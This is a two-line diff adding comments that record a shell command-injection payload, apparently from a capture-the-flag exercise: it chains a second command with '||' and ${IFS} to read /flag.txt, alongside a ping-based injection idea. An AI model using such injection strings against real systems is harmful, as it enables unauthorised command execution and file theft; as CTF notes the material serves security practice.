@@ -1,0 +1,2 @@
+#real command: '||cat${IFS}/flag.txt||\'
+#idea from: ping '\';"ls";\\''
